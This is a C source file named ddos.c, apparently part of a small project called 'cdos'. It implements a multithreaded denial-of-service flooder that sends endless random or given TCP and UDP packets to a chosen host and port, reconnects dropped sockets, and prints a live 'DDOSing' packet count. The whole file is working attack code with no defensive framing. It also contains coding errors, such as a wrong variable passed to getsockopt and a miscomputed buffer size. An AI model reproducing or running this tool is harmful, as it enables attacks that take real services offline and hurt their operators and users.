//
//  ddos.c
//  cdos
//
//  Created by Andre Zay on 17.12.2017.
//  Copyright © 2017 Andre Zay. All rights reserved.
//

#include "ddos.h"

int pc;
char* __host;
int __port;
int tcount = 0;
pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;

bool __run;

void __exit()
{
    __run = false;
    pthread_mutex_lock(&mutex);
    fflush(stdout);
    printf("%c[2K", 27);
    printf("\n");
    info("Quitting...");
    pthread_mutex_unlock(&mutex);
    exit(0);
}
void _ddos_tcp(char* host, int port, char* packet)
{
    tcount++;
    bool RAND_PACKET = (packet == NULL);
    if (port == 0) {
        port = randport();
    }
    int sock = dos_tcp_sock(host, port);
    if (sock < 0) {
        pthread_mutex_lock(&mutex);
        fflush(stdout);
        error("Connection failure");
        error("Quitting thread!");
        pthread_mutex_unlock(&mutex);
        return;
    }
    char* buf = (char*)malloc(1024 * sizeof(buf));
    size_t _bufsize = 1024 * sizeof(buf);
    for (;;) {
        if (!__run) {
            shutdown(sock, 2);
            free(buf);
            break;
        }
        assert(sock >= 0);
        if (RAND_PACKET) {
            packet = randstring(randrange(64, 2048));
        }
        if (dos_tcp_send_noalloc(sock, packet, buf, _bufsize)) {
            int _error = 0;
            socklen_t len = sizeof(error);
            int retval = getsockopt(socket, SOL_SOCKET, SO_ERROR, &_error, &len);
            if (_error != 0) {
                pthread_mutex_lock(&mutex);
                shutdown(sock, 2);
                fflush(stdout);
                warning("Socket disconnected.");
                info("Attempting to reconnect tcp sock");
                sock = dos_tcp_sock(host, port);
                pthread_mutex_unlock(&mutex);
            }
        }
        pc++;
    }
    tcount--;
}
void _ddos_udp(char* host, int port, char* packet)
{
    tcount++;
    bool RAND_PACKET = (packet == NULL);
    bool RAND_PORT = (port == 0);
    int sock = dos_udp_sock();
    char* buf = (char*)malloc(sizeof(char) * 1024);
    size_t bufsize = 1024 * sizeof(char);
    for (;;) {
        if (!__run) {
            shutdown(sock, 2);
            free(buf);
            break;
        }
        if (RAND_PACKET) {
            packet = randstring(randrange(64, 2048));
        }
        if (RAND_PORT) {
            port = randport();
        }
        dos_udp_send(sock, host, port, packet, buf, bufsize);
        pc++;
    }
    tcount--;
}

void _ddos_stat()
{
    success("Status:");
    success("Hit ^C to exit");
    for (;;) {
        if (!__run) {
            break;
        }
        success_n("DDOSing %s:%d;Packets sent:%d,thread count:%d\r", __host, __port, pc, tcount);
    }
}
_dos_param* _init_dos_p(char* host, int port, char* packet, uint8_t mode)
{
    _dos_param* p = malloc(sizeof(_dos_param) + (strlen(host) + strlen(packet)) * sizeof(char));
    p->host = host;
    p->port = port;
    p->packet = packet;
    p->mode = mode;
    return p;
}
void __ddos_wrapper(_dos_param* x)
{
    if (x->mode == MODE_TCP) {
        _ddos_tcp(x->host, x->port, x->packet);
    } else if (x->mode == MODE_UDP) {
        _ddos_udp(x->host, x->port, x->packet);
    } else {
        error("Bad wrapper descriptor!");
        assert(false);
    }
}
void ddos(char* host, int port, char* packet, int _tcount, int mode)
{
    pc = 0;
    __run = true;
    signal(SIGPIPE, SIG_IGN);
    signal(SIGINT, __exit);
    __host = host;
    __port = port;
    _dos_param* p = _init_dos_p(host, port, packet, mode);
    pthread_t* _ddos = (pthread_t*)malloc(sizeof(pthread_t) * (_tcount + 1));
    // pthread_mutex_init(&mutex, NULL);
    pthread_create(&_ddos[0], NULL, _ddos_stat, NULL);
    for (int i = 1; i < _tcount + 1; i++) {
        if (pthread_create(&_ddos[i], NULL, __ddos_wrapper, p)) {
            error("Failed to create thread #%d!", i);
            continue;
        }
    }
    pthread_join(_ddos[_tcount], NULL);
}
